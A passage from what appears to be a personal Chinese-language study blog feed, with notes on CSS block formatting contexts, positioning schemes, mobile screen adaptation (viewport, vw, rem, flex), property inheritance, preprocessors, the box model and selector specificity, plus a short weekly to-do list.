color="#FF8C00">因为如果一个元素能够同时处于两个BFC中，那么就意味着这个元素能与两个BFC中的元素发生作用，就违反了BFC的隔离作用。</font></p><h2 id="三种文档流的定位方案"><a href="#三种文档流的定位方案" class="headerlink" title="三种文档流的定位方案"></a>三种文档流的定位方案</h2><h3 id="常规流-Normal-flow"><a href="#常规流-Normal-flow" class="headerlink" title="常规流(Normal flow)"></a>常规流(Normal flow)</h3><ul><li>在常规流中，盒一个接着一个排列;</li><li>在块级格式化上下文里面， 它们竖着排列；</li><li>在行内格式化上下文里面， 它们横着排列;</li><li><font color="#FF00FF">当position为static或relative，并且float为none时会触发常规流</font>；</li><li>对于静态定位(static positioning)，position: static，盒的位置是常规流布局里的位置；</li><li>对于相对定位(relative positioning)，position: relative，盒偏移位置由top、bottom、left、right属性定义。即使有偏移，仍然保留原有的位置，其它常规流不能占用这个位置。</li></ul><h3 id="浮动-Floats"><a href="#浮动-Floats" class="headerlink" title="浮动(Floats)"></a>浮动(Floats)</h3><ul><li>左浮动元素尽量靠左、靠上，右浮动同理</li><li>这导致常规流环绕在它的周边，除非设置 clear 属性</li><li>浮动元素不会影响块级元素的布局</li><li>但浮动元素会影响行内元素的布局，让其围绕在自己周围，撑大父级元素，从而间接影响块级元素布局</li><li>最高点不会超过当前行的最高点、它前面的浮动元素的最高点</li><li>不超过它的包含块，除非元素本身已经比包含块更宽</li><li>行内元素出现在左浮动元素的右边和右浮动元素的左边，左浮动元素的左边和右浮动元素的右边是不会摆放浮动元素的</li></ul><h3 id="绝对定位-Absolute-positioning"><a href="#绝对定位-Absolute-positioning" class="headerlink" title="绝对定位(Absolute positioning)"></a>绝对定位(Absolute positioning)</h3><ul><li>绝对定位方案，盒从常规流中被移除，不影响常规流的布局；</li><li>它的定位相对于它的包含块，相关CSS属性：top、bottom、left、right；</li><li>如果元素的属性position为absolute或fixed，它是绝对定位元素；</li><li>对于position: absolute，元素定位将相对于上级元素中最近的一个relative、fixed、absolute，如果没有则相对于body；</li></ul><h2 id="BFC触发方式"><a href="#BFC触发方式" class="headerlink" title="BFC触发方式"></a>BFC触发方式</h2><ul><li>根元素，即HTML标签</li><li>浮动元素：float值为left、right</li><li>overflow值不为 visible，为auto、scroll、hidden</li><li>display值为inline-block、table-cell、table-caption、table、inline-table、flex、inline-flex、grid、inline-grid</li><li>定位元素：position值为absolute、fixed</li></ul><p><strong>注意：</strong> <font color="#FF00FF">display:table也可以生成BFC的原因在于Table会默认生成一个匿名的table-cell，是这个匿名的table-cell生成了BFC。</font></p><h2 id="约束规则"><a href="#约束规则" class="headerlink" title="约束规则"></a>约束规则</h2><p><strong>浏览器对BFC区域的约束规则：</strong></p><ol><li>生成BFC元素的子元素会一个接一个的放置。</li><li>垂直方向上他们的起点是一个包含块的顶部，两个相邻子元素之间的垂直距离取决于元素的margin特性。在BFC中相邻的块级元素的外边距会折叠(Mastering margin collapsing)</li><li>生成BFC元素的子元素中，每一个子元素左外边距与包含块的左边界相接触（对于从右到左的格式化，右外边距接触右边界），即使浮动元素也是如此（尽管子元素的内容区域会由于浮动而压缩），除非这个子元素也创建了一个新的BFC（如它自身也是一个浮动元素）。</li></ol><p><strong>规则解读：</strong></p><ol><li>内部的Box会在垂直方向上一个接一个的放置</li><li>内部的Box垂直方向上的距离由margin决定。（完整的说法是：属于同一个BFC的两个相邻Box的margin会发生折叠，不同BFC不会发生折叠。）</li><li>每个元素的左外边距与包含块的左边界相接触（从左向右），即使浮动元素也是如此。（这说明BFC中子元素不会超出他的包含块，而position为absolute的元素可以超出他的包含块边界）</li><li>BFC的区域不会与float的元素区域重叠</li><li>计算BFC的高度时，浮动子元素也参与计算</li></ol><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p><strong>BFC是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面元素</strong>，反之亦然。我们可以利用BFC的这个特性来做很多事。</p><ol><li>阻止元素被浮动元素覆盖<br>一个正常文档流的block元素可能被一个float元素覆盖，挤占正常文档流，因此可以设置一个元素的float、 display、position值等方式触发BFC，以阻止被浮动盒子覆盖。</li><li>可以包含浮动元素<br>通过改变包含浮动子元素的父盒子的属性值，触发BFC，以此来包含子元素的浮动盒子。</li><li>阻止因为浏览器因为四舍五入造成的多列布局换行的情况<br>有时候因为多列布局采用小数点位的width导致因为浏览器因为四舍五入造成的换行的情况，可以在最后一 列触发BFC的形式来阻止换行的发生。比如下面栗子的特殊情况</li><li>阻止相邻元素的margin合并<br>属于同一个BFC的两个相邻块级子元素的上下margin会发生重叠，(设置writing-mode:tb-rl时，水平 margin会发生重叠)。所以当两个相邻块级子元素分属于不同的BFC时可以阻止margin重叠。<br>这里给任一个相邻块级盒子的外面包一个div，通过改变此div的属性使两个原盒子分属于两个不同的BFC，以此来阻止margin重叠。</li></ol><h1 id="移动端适配方案"><a href="#移动端适配方案" class="headerlink" title="移动端适配方案"></a>移动端适配方案</h1><p><strong>适配思路</strong><br>设计稿（750*1334） —&gt; 开发 —&gt; 适配不同的手机屏幕，使其显得合理</p><p><strong>原则</strong><br>开发时方便，写代码时设置的值要和标注的 160px 相关<br>方案要适配大多数手机屏幕，并且无 BUG<br>用户体验要好，页面看着没有不适感</p><p><strong>思路</strong><br>写页面时，按照设计稿写固定宽度，最后再统一缩放处理，在不同手机上都能用<br>按照设计稿的标准开发页面，在手机上部分内容根据屏幕宽度等比缩放，部分内容按需要变化，需要缩放的元素使用 rem, vw 相对单位，不需要缩放的使用 px<br>固定尺寸+弹性布局，不需要缩放</p><p><strong>viewport 适配</strong><br>根据设计稿标准（750px 宽度）开发页面，写完后页面及元素自动缩小，适配 375 宽度的屏幕</p><p>在 head 里设置如下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;width=750,initial-scale=0.5&quot;&gt;</span><br></pre></td></tr></table></figure><p><strong>initial-scale = 屏幕的宽度 / 设计稿的宽度</strong><br>为了适配其他屏幕，需要动态的设置 initial-scale 的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    const WIDTH = 750</span><br><span class="line">    const mobileAdapter = () =&gt; &#123;</span><br><span class="line">      let scale = screen.width / WIDTH</span><br><span class="line">      let content = `width=$&#123;WIDTH&#125;, initial-scale=$&#123;scale&#125;, maximum-scale=$&#123;scale&#125;, minimum-scale=$&#123;scale&#125;`</span><br><span class="line">      let meta = document.querySelector(&#x27;meta[name=viewport]&#x27;)</span><br><span class="line">      if (!meta) &#123;</span><br><span class="line">        meta = document.createElement(&#x27;meta&#x27;)</span><br><span class="line">        meta.setAttribute(&#x27;name&#x27;, &#x27;viewport&#x27;)</span><br><span class="line">        document.head.appendChild(meta)</span><br><span class="line">      &#125;</span><br><span class="line">      meta.setAttribute(&#x27;content&#x27;,content)</span><br><span class="line">    &#125;</span><br><span class="line">    mobileAdapter()</span><br><span class="line">    window.onorientationchange = mobileAdapter //屏幕翻转时再次执行</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br></pre></td></tr></table></figure><p><strong>缺点就是边线问题，不同尺寸下，边线的粗细是不一样的（等比缩放后），全部元素都是等比缩放，实际显示效果可能不太好</strong></p><p><strong>vw 适配（部分等比缩放）</strong></p><ol><li>开发者拿到设计稿（假设设计稿尺寸为750px，设计稿的元素标注是基于此宽度标注）</li><li>开始开发，对设计稿的标注进行转换，把px换成vw。比如页面元素字体标注的大小是32px，<font color="#FF00FF">换成vw为 (100/750)*32 vw</font></li><li>对于需要等比缩放的元素，CSS使用转换后的单位</li><li>对于不需要缩放的元素，比如边框阴影，使用固定单位px</li></ol><p>关于换算，为了开发方便，利用自定义属性，CSS变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1&quot;&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    const WIDTH = 750</span><br><span class="line">    //:root &#123; --width: 0.133333 &#125; 1像素等于多少 vw</span><br><span class="line">    document.documentElement.style.setProperty(&#x27;--width&#x27;, (100 / WIDTH)) </span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br></pre></td></tr></table></figure><p><strong>注意此时，meta 里就不要去设置缩放了</strong></p><p>业务代码里就可以写，实现了按需缩放</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">header &#123;</span><br><span class="line">  font-size: calc(28vw * var(--width))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>rem 适配</strong></p><p>开发者拿到设计稿（假设设计稿尺寸为750px，设计稿的元素标是基于此宽度标注）<br>开始开发，对设计稿的标注进行转换<br>对于需要等比缩放的元素，CSS使用转换后的单位<br>对于不需要缩放的元素，比如边框阴影，使用固定单位px</p><p>假设设计稿的某个字体大小是 40px, 手机屏幕上的字体大小应为 420/750*40 = 22.4px (体验好)，换算成 rem（相对于 html 根节点，假设 html 的 font-size = 100px,）则这个字体大小为 0.224 rem，写样式时，对应的字体设置为 0.224 rem 即可，其他元素尺寸也做换算.</p><p><strong>但是有问题</strong><br>举个例子，设计稿的标注 是40px，写页面时还得去做计算，很麻烦（全部都要计算）<br>能不能规定一下，看到40px ,就应该写40/100 = 0.4 rem,这样看到就知道写多少了（不用计算），此时的html 的 font-size 就不能是 100px 了，应该为 (420*100)/750 = 56px，100为我们要规定的那个参数<br><strong>根据不同屏幕宽度，设置 html 的 font-size 值</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1&quot;&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    const WIDTH = 750 //设计稿尺寸</span><br><span class="line">    const setView = () =&gt; &#123;</span><br><span class="line">      document.documentElement.style.fontSize = (100 * screen.width / WIDTH) + &#x27;px&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    window.onorientationchange = setView</span><br><span class="line">    setView()</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br></pre></td></tr></table></figure><p><font color="#FF8C00">对于需要等比缩放的元素，CSS使用转换后的单位</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">header &#123;</span><br><span class="line">  font-size: .28rem;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font color="#FF8C00">对于不需要缩放的元素，比如边框阴影，使用固定单位px</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">header &gt; span.active &#123;</span><br><span class="line">  color: #fff;</span><br><span class="line">  border-bottom: 2px solid rgba(255, 255, 255, 0.3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设 html 的 font size = 1px 的话，就可以写 28 rem 了，更方便了，但是浏览器对字体大小有限制，设为 1px 的话，在浏览器中是失效的，会以 12px（或者其他值） 做一个计算 , 就会得到一个很夸张的结果，所以可以把 html 写的大一些<br><strong>使用 sass 库时</strong><br>JS 处理还是一样的，但看着好看些</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@function px2rem($px) &#123;</span><br><span class="line">  @return $px * 1rem / 100;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header &#123;</span><br><span class="line">  font-size: px2rem(28);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上的三种适配方案，都是等比缩放，放到 ipad 上时（设计稿以手机屏幕设计的），页面元素会很大很丑，有些场景下，并不需要页面整体缩放（viewport 自动处理的也很好了），所以有时只需要合理的布局即可。</p><p><strong><font color="#FF8C00">弹性盒适配（合理布局）</font></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width&quot;&gt;</span><br></pre></td></tr></table></figure><p>使用 flex 布局</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">section &#123;</span><br><span class="line">  display: flex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><font color="#FF00FF">总结一下，什么样的页面需要做适配（等比缩放）呢</font></strong></p><ol><li>页面中的布局是栅格化的</li></ol><p>换了屏幕后，到底有多宽多高很难去做设置，整体的都需要改变，所以需要整体的缩放</p><ol start="2"><li>头屏大图，宽度自适应，高度固定的话，对于不同的屏幕，形状就会发生改变（放到ipad上就变成长条了），宽度变化后，高度也要保持等比例变化</li><li>大屏，需要适配很多的电视尺寸，要求撑满屏幕，不能有滚动条，此时若换个屏幕</li></ol><p>此时需要考虑小元素用 vh, 宽和高都用 vh 去表示，中间的大块去自适应，这就做到了大屏的适配，屏幕变小了，整体变小了（体验更好），中间这块撑满了屏幕</p>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>未完成的List</title>
      <link href="/2022/08/05/%E6%9C%AA%E5%AE%8C%E6%88%90%E7%9A%84List-DESKTOP-B0TSPR2/"/>
      <url>/2022/08/05/%E6%9C%AA%E5%AE%8C%E6%88%90%E7%9A%84List-DESKTOP-B0TSPR2/</url>
      
        <content type="html"><![CDATA[<h1 id="八月"><a href="#八月" class="headerlink" title="八月"></a>八月</h1><h2 id="第一周"><a href="#第一周" class="headerlink" title="第一周"></a>第一周</h2><ul><li><input disabled="" type="checkbox"> CSS新样式未写完</li><li><input disabled="" type="checkbox"> Promise概念未梳理完</li><li><input disabled="" type="checkbox"> 基本算法</li></ul><h2 id="第二周"><a href="#第二周" class="headerlink" title="第二周"></a>第二周</h2><ul><li><input disabled="" type="checkbox"> 基础算法</li><li><input disabled="" type="checkbox"> 腾讯的小红</li></ul>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> weekly </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS(第十天)</title>
      <link href="/2022/08/04/CSS(%E7%AC%AC%E5%8D%81%E5%A4%A9)/"/>
      <url>/2022/08/04/CSS(%E7%AC%AC%E5%8D%81%E5%A4%A9)/</url>
      
        <content type="html"><![CDATA[<h1 id="继承相关"><a href="#继承相关" class="headerlink" title="继承相关"></a>继承相关</h1><p>css的继承：就是给父级设置一些属性，子级继承了父级的该属性，这就是我们的css中的继承。 官方解释，继承是一种规则，它允许样式不仅应用于特定的html标签元素，而且应用于其后代元素。</p><h2 id="无继承性的属性"><a href="#无继承性的属性" class="headerlink" title="无继承性的属性"></a>无继承性的属性</h2><ol><li><p>display：规定元素应该生成的框的类型</p></li><li><p>文本属性：<br>vertical-align：垂直文本对齐<br>text-decoration：规定添加到文本的装饰<br>text-shadow：文本阴影效果<br>white-space：空白符的处理<br>unicode-bidi：设置文本的方向</p></li><li><p>盒子模型的属性：width、height、margin 、margin-top、margin-right、margin-bottom、margin-left、border、 border-style、border-top-style、border-right-style、border-bottom-style、border-left-style、border-width、border-top-width、border-right-right、border-bottom-width、border-left-width、border-color、border-top-color、border-right-color、border-bottom-color、border-left-color、border-top、border-right、border-bottom、border-left、padding、padding-top、padding-right、padding-bottom、padding-left</p></li><li><p>背景属性：background、background-color、background-image、background-repeat、background-position、background-attachment</p></li><li><p>定位属性：float、clear、position、top、right、bottom、left、min-width、min-height、max-width、max-height、overflow、clip、z-index</p></li><li><p>生成内容属性：content、counter-reset、counter-increment</p></li><li><p>轮廓样式属性：outline-style、outline-width、outline-color、outline</p></li><li><p>页面样式属性：size、page-break-before、page-break-after</p></li><li><p>声音样式属性：pause-before、pause-after、pause、cue-before、cue-after、cue、play-during</p><h2 id="有继承性的属性"><a href="#有继承性的属性" class="headerlink" title="有继承性的属性"></a>有继承性的属性</h2></li><li><p>字体系列属性<br>font：组合字体<br>font-family：规定元素的字体系列<br>font-weight：设置字体的粗细<br>font-size：设置字体的尺寸<br>font-style：定义字体的风格<br>font-variant：设置小型大写字母的字体显示文本，这意味着所有的小写字母均会被转换为大写，但是所有使用小型大写 字体的字母与其余文本相比，其字体尺寸更小。<br>font-stretch：对当前的 font-family 进行伸缩变形。所有主流浏览器都不支持。<br>font-size-adjust：为某个元素规定一个 aspect 值，这样就可以保持首选字体的 x-height。</p></li><li><p>文本系列属性<br>text-indent：文本缩进<br>text-align：文本水平对齐<br>line-height：行高<br>word-spacing：增加或减少单词间的空白（即字间隔）<br>letter-spacing：增加或减少字符间的空白（字符间距）<br>text-transform：控制文本大小写<br>direction：规定文本的书写方向<br>color：文本颜色 a元素除外</p></li><li><p>元素可见性：visibility</p></li><li><p>表格布局属性：caption-side、border-collapse、border-spacing、empty-cells、table-layout</p></li><li><p>列表布局属性：list-style-type、list-style-image、list-style-position、list-style</p></li><li><p>生成内容属性：quotes</p></li><li><p>光标属性：cursor</p></li><li><p>页面样式属性：page、page-break-inside、windows、orphans</p></li><li><p>声音样式属性：speak、speak-punctuation、speak-numeral、speak-header、speech-rate、volume、voice-family、 pitch、pitch-range、stress、richness、、azimuth、elevation</p></li></ol><p><strong>所有元素可以继承的属性</strong></p><ul><li>元素可见性：visibility</li><li>光标属性：cursor</li></ul><p><strong>内联元素可以继承的属性</strong></p><ul><li>字体系列属性</li><li>除text-indent、text-align之外的文本系列属性</li></ul><p><strong>块级元素可以继承的属性</strong></p><ul><li>text-indent、text-align</li></ul><h1 id="css预处理工具"><a href="#css预处理工具" class="headerlink" title="css预处理工具"></a>css预处理工具</h1><blockquote><p><strong>CSS 预处理器</strong>是一个能让你通过预处理器自己独有的语法来生成CSS的程序。<br>css预处理器种类繁多，三种主流css预处理器是Less、Sass（Scss）及Stylus；</p></blockquote><p><strong>Sass：</strong><br>2007年诞生，最早也是最成熟的CSS预处理器，拥有ruby社区的支持和compass这一最强大的css框架，目前受LESS影响，已经进化到了全面兼容CSS的SCSS（SCSS 需要使用分号和花括号而不是换行和缩进）。</p><p><strong>Less：</strong><br>2009年</p><p>比较出现，受SASS的影响较大，但又使用CSS的语法，让大部分开发者和设计师更容易上手，在ruby社区之外支持者远超过SASS。其缺点是比起SASS来，可编程功能不够。优点是简单和兼容CSS，反过来也影响了SASS演变到了SCSS的时代，著名的Twitter Bootstrap就是采用LESS做底层语言的。</p><p><strong>Stylus：</strong><br>2010年产生，来自Node.js社区，主要用来给Node项目进行CSS预处理支持，在此社区之内有一定支持者，在广泛的意义上人气还完全不如SASS和LESS。</p><p><strong>比较</strong><br>首先 <font color="#FF8C00">Sass 和 Less 都使用的是标准的 CSS 语法</font>，因此如果可以很方便的将已有的 CSS 代码转为预处理器代码，<font color="#FF8C00">默认 Sass 使用 .sass 扩展名，而 Less 使用 .less 扩展名。</font></p><blockquote><p>h1 {<br>  color: #0982C1;<br>}</p></blockquote><p>这是一个再普通不过的，不过 Sass 同时也支持老的语法，就是不包含花括号和分号的方式：</p><blockquote><p>h1<br>color: #0982c1</p></blockquote><p>而 <font color="#FF8C00">Stylus 支持的语法要更多样性一点，它默认使用 .styl 的文件扩展名</font>，下面是 Stylus 支持的语法</p><blockquote><p>/* style.styl <em>/<br>h1 {<br>  color: #0982C1;<br>}<br>/</em> omit brackets <em>/<br>h1<br>color: #0982C1;<br>/</em> omit colons and semi-colons */<br>h1<br>color #0982C1</p></blockquote><p>可以在同一个样式单中使用不同的变量，例如下面的写法也不会报错：</p><blockquote><p>h1 {<br>  color #0982c1<br>}<br>h2<br>font-size: 1.2em</p></blockquote><h1 id="行内元素和块级元素什么区别，然后怎么相互转换"><a href="#行内元素和块级元素什么区别，然后怎么相互转换" class="headerlink" title="行内元素和块级元素什么区别，然后怎么相互转换"></a>行内元素和块级元素什么区别，然后怎么相互转换</h1><p><strong>块级元素</strong></p><ol><li>总是从新的一行开始，即各个块级元素独占一行，默认<font color="#FF00FF">垂直向下排列</font>；</li><li>高度、宽度、margin及padding都是可控的，设置有效，有边距效果；</li><li>宽度没有设置时，<font color="#FF00FF">默认为100%</font>；</li><li>块级元素中可以包含块级元素和行内元素。</li></ol><p><strong>行内元素</strong></p><ol><li>和其他元素都在一行，即行内元素和其他行内元素都会在一条水平线上排列；</li><li>高度、宽度是不可控的，设置无效，由内容决定。</li><li>根据标签语义化的理念，行内元素<font color="#FF00FF">最好只包含行内元素，不包含块级元素</font>。</li></ol><p><strong><font color="#DC143C">转换</font></strong></p><blockquote><p>当然块级元素与行内元素之间的特性是可以相互转换的。HTML可以将元素分为行内元素、块状元素和行内块状元素三种。<br>使用display属性能够将三者任意转换：</p></blockquote><p>(1)display:inline;转换为行内元素；<br>(2)display:block;转换为块状元素；<br>(3)display:inline-block;转换为行内块状元素。</p><h1 id="块元素哪些属性可以继承？"><a href="#块元素哪些属性可以继承？" class="headerlink" title="块元素哪些属性可以继承？"></a>块元素哪些属性可以继承？</h1><p>text-indent(文本缩进)、text-align、visibility、cursor</p><h1 id="盒模型"><a href="#盒模型" class="headerlink" title="盒模型"></a>盒模型</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>CSS盒模型本质上是一个盒子，封装周围的HTML元素，它包括：<font color="#FF8C00">外边距（margin）、边框（border）、内边距（padding）、实际内容（content</font>）四个属性。<br>CSS盒模型：<strong>标准模型 + IE模型</strong></p><ol><li>W3C盒子模型(标准盒模型)</li></ol><p><strong><font color="#FF8C00">一个盒子的总宽度= width + padding(左右) + border(左右)+ margin(左右)</font></strong> </p><p><img src="https://files.shanqianche.cn/20228/1659621954165.png" alt="标准盒子模型"></p><p>要让网页按标准盒模型去解析，则需要加上 doctype声明，否则不同的浏览器会按照自己的标准去解析。<br>2. 怪异盒模型</p><p><strong><font color="#DC143C">一个盒子的总宽度= width + margin(左右)（即width已经包含了padding和border值）</font></strong></p><p><img src="https://files.shanqianche.cn/20228/1659622032524.png" alt="怪异盒模型"></p><h2 id="标准模型和IE模型的区别"><a href="#标准模型和IE模型的区别" class="headerlink" title="标准模型和IE模型的区别"></a>标准模型和IE模型的区别</h2><p><strong>计算宽度和高度的不同</strong><br>标准盒模型：盒子总宽度/高度 =width/height + padding + border + margin。（ 即 width/height 只是 内容高度，不包含 padding 和 border 值 ）<br>IE盒子模型：盒子总宽度/高度 =width/height + margin = (内容区宽度/高度 + padding + border) + margin。（ 即 width/height 包含了 padding 和 border 值 ）</p><p><font color="#FF00FF"><strong>CSS如何设置这两种模型</strong></font></p><ul><li>标准：box-sizing: content-box;( 浏览器默认设置 )</li><li>IE：box-sizing: border-box;</li></ul><p><strong>JS如何获取盒模型对应的宽和高</strong></p><p>（1）dom.style.width/height<font color="#FF00FF">只能取到行内样式的宽和高</font>，style 标签中和 link 外链的样式取不到。<br>（2）dom.currentStyle.width/height（<font color="#FF00FF">只有IE兼容）取到的是最终渲染后的宽和高</font><br>（3）window.getComputedStyle(dom).width/height同（2）但是多浏览器支持，IE9 以上支持。<br>（4）dom.getBoundingClientRect().width/height<font color="#FF8C00">也是得到渲染后的宽和高</font>，大多浏览器支持。IE9 以上支持，除此外还可以取到相对于视窗的上下左右的距离。<br>（6）dom.offsetWidth/offsetHeigh<font color="#FF8C00">t包括高度（宽度）、内边距和边框，不包括外边距。最常用，兼容性最好</font>。<br><strong>BFC（边距重叠解决方案）</strong></p><ol><li>BFC基本概念</li></ol><p><strong>BFC: 块级格式化上下文</strong>TODO<br>BFC基本概念：BFC是CSS布局的一个概念，<font color="#FF8C00">是一块独立的渲染区域，是一个环境，里面的元素不会影响到外部的元素 。</font><br><strong>父子元素和兄弟元素边距重叠，重叠原则取最大值。</strong> 空元素的边距重叠是取margin与 padding 的最大值。</p><ol start="2"><li>BFC原理（渲染规则|布局规则）：</li></ol><p>（1）内部的Box会在<font color="#FF00FF">垂直方向</font>，从顶部开始一个接着一个地放置；<br>（2）<font color="#FF00FF">Box垂直方向的距离由margin(外边距)决定，属于同一个BFC的两个相邻Box的margin会发生重叠</font>；<br>（3）<font color="#FF00FF">每个元素的margin Box的左边， 与包含块border Box的左边相接触</font>，（对于从左到右的格式化，否则相反）。即使存在浮动也是如此；<br>（4）BFC 在页面上是一个隔离的独立容器，外面的元素不会影响里面的元素，反之亦然。文字环绕效果，设置float；<br>（5）<font color="#FF00FF">BFC 的区域不会与float Box重叠（清浮动）;</font><br>（6）计算BFC的高度时，<font color="#FF00FF">浮动元素也参与计算</font>。</p><ol start="3"><li>CSS在什么情况下会创建出BFC（即脱离文档流）</li></ol><p>0、根元素，即 HTML 元素（最大的一个BFC）<br>1、浮动（float 的值不为 none）<br>2、绝对定位元素（position 的值为 absolute 或 fixed）<br>3、行内块（display 为 inline-block）<br>4、表格单元（display 为 table、table-cell、table-caption、inline-block 等 HTML 表格相关的属性)<br>5、<font color="#FF00FF">弹性盒（display 为 flex 或 inline-flex）</font><br>6、<font color="#FF00FF">默认值。内容不会被修剪，会呈现在元素框之外（overflow 不为 visible）</font></p><ol start="4"><li><strong>BFC作用（使用场景）</strong></li></ol><p>1、自适应两（三）栏布局（避免多列布局由于宽度计算四舍五入而自动换行）<br>2、避免元素被浮动元素覆盖<br>3、<font color="#FF00FF">可以让父元素的高度包含子浮动元素，清除内部浮动（原理：触发父div的BFC属性，使下面的子div都处在父div的同一个BFC区域之内）</font><br>4、去除边距重叠现象，分属于不同的BFC时，可以阻止margin重叠</p><h2 id="IFC"><a href="#IFC" class="headerlink" title="IFC"></a>IFC</h2><p><strong>IFC: 行内格式化上下文</strong></p><p><img src="https://files.shanqianche.cn/20228/1659623431765.png" alt="IFC"></p><p><strong>IFC原理（渲染规则|布局规则）</strong><br>（1）内部的Box会在水平方向，从含块的顶部开始一个接着一个地放置；<br>（2）这些Box之间的水平方向的<font color="#FF8C00">margin，border和padding都有效；</font><br>（3）<font color="#FF00FF">Box垂直对齐方式：以它们的底部、顶部对齐，或以它们里面的文本的基线（baseline）对齐（默认， 文本与图片对其），</font>例：line-heigth与vertical-align。</p><h1 id="样式优先级"><a href="#样式优先级" class="headerlink" title="样式优先级"></a>样式优先级</h1><blockquote><p>样式类型分为三类</p></blockquote><ol><li>行间</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 style=&quot;font-size:12px;color:#000;&quot;&gt;我的行间CSS样式。&lt;/h1&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li>内联</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">   h1&#123;font-size:12px;</span><br><span class="line">      color:#000;</span><br><span class="line">      &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><ol start="3"><li>外部</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;</span><br></pre></td></tr></table></figure><p><strong><font color="#FF8C00">选择器类型</font></strong></p><ul><li>ID　　#id</li><li>class　　.class</li><li>标签　　p</li><li>通用　　*</li><li>属性　　[type=”text”]</li><li>伪类　　:hover</li><li><font color="#FF00FF"> 伪元素　　::first-line</font></li><li><font color="#FF00FF"> 子选择器、相邻选择器</font></li></ul><p><strong>权重计算规则</strong></p><p>第一等：代表内联样式，如: style=””，权值为1000。<br>第二等：代表ID选择器，如：#content，权值为0100。<br><font color="#FF8C00">第三等：代表类，伪类和属性选择器</font>，如.content，权值为0010。<br><font color="#FF8C00">第四等：代表类型选择器和伪元素选择器，</font>如div p，权值为0001。<br><font color="#FF8C00">通配符、子选择器、相邻选择器等的。如*、&gt;、+,权值为0000。</font><br><font 